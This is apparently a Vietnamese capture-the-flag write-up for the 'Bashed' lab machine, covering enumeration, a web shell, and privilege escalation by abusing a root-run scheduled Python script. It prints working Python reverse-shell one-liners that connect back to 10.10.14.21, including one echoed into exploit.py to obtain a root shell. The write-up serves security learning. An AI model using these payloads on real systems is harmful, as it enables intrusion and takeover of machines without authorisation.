# bashed

liệt kê các port mở

![https://lh7-us.googleusercontent.com/_VPBBjcy6FkC7c6dgk8hi-x0xwaiOLv0y3ObNS_q7e3WH9o33cRIobMO3ZpYIZ5n4pr-m8R311h_qY1QJa-SFWyKMqxlOQIrLS-oX_Jt0gvHe2T2Oe4Jy3tkoH4PVJioIXkxFIt0-9_V](https://lh7-us.googleusercontent.com/_VPBBjcy6FkC7c6dgk8hi-x0xwaiOLv0y3ObNS_q7e3WH9o33cRIobMO3ZpYIZ5n4pr-m8R311h_qY1QJa-SFWyKMqxlOQIrLS-oX_Jt0gvHe2T2Oe4Jy3tkoH4PVJioIXkxFIt0-9_V)

liệt kê các path

![https://lh7-us.googleusercontent.com/roOJwJPJRdisIc3tGsJlb2CaY-RLfWhAM6K6AIqTslii9MqO9HOiDw_uRmvg-QxAC-wTDbk6VTRjz99a2JXDEeAAuxp9PQezND4kkgVuHUbd0iban3KsuI1LBTfr5sR59UnfHUlTY6Oy](https://lh7-us.googleusercontent.com/roOJwJPJRdisIc3tGsJlb2CaY-RLfWhAM6K6AIqTslii9MqO9HOiDw_uRmvg-QxAC-wTDbk6VTRjz99a2JXDEeAAuxp9PQezND4kkgVuHUbd0iban3KsuI1LBTfr5sR59UnfHUlTY6Oy)

truy cập p80 ko thấy thông tin gì

![https://lh7-us.googleusercontent.com/dEc3FvZ6I8IhZ_XR1r1vgUmf_CMOhPquGyjDVQ93rZqpiHwfWqvdltm8XV_FjREza3MX2cnY05jSE4LDx6dWGEvvLQdKdnSQgat3xHqropQ9eQ4uZ1Yj-N5yp3cJMqWQ4sPeDKFa9f5g](https://lh7-us.googleusercontent.com/dEc3FvZ6I8IhZ_XR1r1vgUmf_CMOhPquGyjDVQ93rZqpiHwfWqvdltm8XV_FjREza3MX2cnY05jSE4LDx6dWGEvvLQdKdnSQgat3xHqropQ9eQ4uZ1Yj-N5yp3cJMqWQ4sPeDKFa9f5g)

thử truy cập /dev

![https://lh7-us.googleusercontent.com/_es8e4pNqRCLea_QbO35tnloSG_2pNLUuoafLZI5r1eALeaUhrVRYnaXVqTS9BVunsJwbtyXK-H-b2BeIl206iPtCPpgWY0X-9LbwxL8xd6dYK-LAZ4txmwu1-zDiNkCwcVRWY1YNztt](https://lh7-us.googleusercontent.com/_es8e4pNqRCLea_QbO35tnloSG_2pNLUuoafLZI5r1eALeaUhrVRYnaXVqTS9BVunsJwbtyXK-H-b2BeIl206iPtCPpgWY0X-9LbwxL8xd6dYK-LAZ4txmwu1-zDiNkCwcVRWY1YNztt)

có quyền của www-data

![https://lh7-us.googleusercontent.com/4k6iHc4OKJ8IHNkc62pKkT5UY7PXa8Dn_kpCTnLSGBpdk0stqT8-_YcllCaieGzJYaNfGnvh9HOyuimUo0fQej9gV7Lu0biRsQXhzDrO8fhUH9PqvvL62BG1X61rkXDgefjYCeYomzAW](https://lh7-us.googleusercontent.com/4k6iHc4OKJ8IHNkc62pKkT5UY7PXa8Dn_kpCTnLSGBpdk0stqT8-_YcllCaieGzJYaNfGnvh9HOyuimUo0fQej9gV7Lu0biRsQXhzDrO8fhUH9PqvvL62BG1X61rkXDgefjYCeYomzAW)

![https://lh7-us.googleusercontent.com/bF0GZJH3G7rlIr8GSWqcVlLieGIn9h9ZVjf4islP3PzQS3kA6K7aHmRaGfJjtpLcWdasbDnbeF43NOzKDJ9nbao5d4f8bOEYN8cJnsxHNn9PE957DpW2iKcOTFYZqE5T21dIJXdfbBPx](https://lh7-us.googleusercontent.com/bF0GZJH3G7rlIr8GSWqcVlLieGIn9h9ZVjf4islP3PzQS3kA6K7aHmRaGfJjtpLcWdasbDnbeF43NOzKDJ9nbao5d4f8bOEYN8cJnsxHNn9PE957DpW2iKcOTFYZqE5T21dIJXdfbBPx)

![https://lh7-us.googleusercontent.com/VcODFHOFoIHL1IU6H8176uNTEyQ5a3ZEskzJdHgIS--pL6rQC3CFIgOCRs0dB3_J77__DALjTuFwcjgPOMwNIDzKM_7dM37_zFzdk6bkAMfUxJ6rOc-3qVdDrL0OfAcHZOHUU2Kmf_Sd](https://lh7-us.googleusercontent.com/VcODFHOFoIHL1IU6H8176uNTEyQ5a3ZEskzJdHgIS--pL6rQC3CFIgOCRs0dB3_J77__DALjTuFwcjgPOMwNIDzKM_7dM37_zFzdk6bkAMfUxJ6rOc-3qVdDrL0OfAcHZOHUU2Kmf_Sd)

![https://lh7-us.googleusercontent.com/l-wCdokMAWpRBxOwL9U02EUdp0tu3PJC1hBiuTf0gWX2QkuazFSkejpf6BEpRsDsG3h_00Euv1SF9uVPX-uUTvHIOmICaJ1ldIpP8-TZsGCFsX3BWBG8xkMAAE7URqEjx9KLxy7wt2Yg](https://lh7-us.googleusercontent.com/l-wCdokMAWpRBxOwL9U02EUdp0tu3PJC1hBiuTf0gWX2QkuazFSkejpf6BEpRsDsG3h_00Euv1SF9uVPX-uUTvHIOmICaJ1ldIpP8-TZsGCFsX3BWBG8xkMAAE7URqEjx9KLxy7wt2Yg)

reverse shell php:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",4433));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(!["/bin/sh","-i"]);'

netcat

![https://lh7-us.googleusercontent.com/GlW_iHcAZN7XGXI2lYsMqammPwtt3ecy-IAHUn3IYakHjc12Z8ebZYQGQHyztDRxy-jEs3vBj60RFM0Q41HOBWvr0eo2_zYh0dbdzHo9sJHA5YRreuUwnsxl525pAkoDS_SNv32NZLBD](https://lh7-us.googleusercontent.com/GlW_iHcAZN7XGXI2lYsMqammPwtt3ecy-IAHUn3IYakHjc12Z8ebZYQGQHyztDRxy-jEs3vBj60RFM0Q41HOBWvr0eo2_zYh0dbdzHo9sJHA5YRreuUwnsxl525pAkoDS_SNv32NZLBD)

có quyền scriptmanager

nâng cấp shell:

python -c 'import pty; pty.spawn("/bin/bash")'

tìm thấy file test.py có nội dung ghi vào file test.txt

![https://lh7-us.googleusercontent.com/8VmZjLQqLKvsdvw8NWPjYpMqu9pxv8U2siPfD0pyxmF0H0gv-BvTZ8DtP-XBAxVxjDaYDD-M6kg_EuYCCOUYQ1rnr21okwGNXxFmxhYE2h78xY5r84gZpK9XPqQBp61EzMhgxwzCA3mN](https://lh7-us.googleusercontent.com/8VmZjLQqLKvsdvw8NWPjYpMqu9pxv8U2siPfD0pyxmF0H0gv-BvTZ8DtP-XBAxVxjDaYDD-M6kg_EuYCCOUYQ1rnr21okwGNXxFmxhYE2h78xY5r84gZpK9XPqQBp61EzMhgxwzCA3mN)

trong cùng thư mục tồn tại file test.txt

thử đổi tên thành test1.txt, nhận thấy khoảng 1p sau xuất hiện file test.txt mới do root tạo-> file test.py được lập lịch tự động thực thi. có thể các file .py khác cũng thế

![https://lh7-us.googleusercontent.com/hVYpro-GvUz3ynMj_gqlshCdsrf6SuAyq4jeyF2qNWQ1YrDmZbpm_EM3D1qMF82qgHsQSDDsh5cYCKeqSMNgVMfC4ttXht4zDgz_HjScRHWsknDkK-VofZ7Zhax1dm_sVk8Vm_p8efXo](https://lh7-us.googleusercontent.com/hVYpro-GvUz3ynMj_gqlshCdsrf6SuAyq4jeyF2qNWQ1YrDmZbpm_EM3D1qMF82qgHsQSDDsh5cYCKeqSMNgVMfC4ttXht4zDgz_HjScRHWsknDkK-VofZ7Zhax1dm_sVk8Vm_p8efXo)

![https://lh7-us.googleusercontent.com/iQmJuItEZXVH6ok3tpP3kt-g3rfG6rffJu8kEIlk7rzFOps74Ju_5yXyinzf1zSAKHfDgbnPpS3-Yfo71ewnWmEEky-9K5kZJpnmrEa3x-JL7jwA6rTPRLeUBwX0aDoOZeqyhNRT6GgI](https://lh7-us.googleusercontent.com/iQmJuItEZXVH6ok3tpP3kt-g3rfG6rffJu8kEIlk7rzFOps74Ju_5yXyinzf1zSAKHfDgbnPpS3-Yfo71ewnWmEEky-9K5kZJpnmrEa3x-JL7jwA6rTPRLeUBwX0aDoOZeqyhNRT6GgI)

thử tạo file exploit.py với payload để tạo reverse shell và lấy quyền root

echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.21\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(![\"/bin/sh\",\"-i\"]);" > exploit.py

netcat và lấy flag root

![https://lh7-us.googleusercontent.com/Rj-y35hD1teNoECDG2yuHK2cFCWmYSyBd5cN3hMI7A7HcXHNiNO2XufcUadp7P3u9NBONnnuSfjfbbUG9ot_7p2xOsW1UF_YLhvxkNJkjJOqTWAxFXtaRnPo_GATvbsVDoVuayJobenx](https://lh7-us.googleusercontent.com/Rj-y35hD1teNoECDG2yuHK2cFCWmYSyBd5cN3hMI7A7HcXHNiNO2XufcUadp7P3u9NBONnnuSfjfbbUG9ot_7p2xOsW1UF_YLhvxkNJkjJOqTWAxFXtaRnPo_GATvbsVDoVuayJobenx)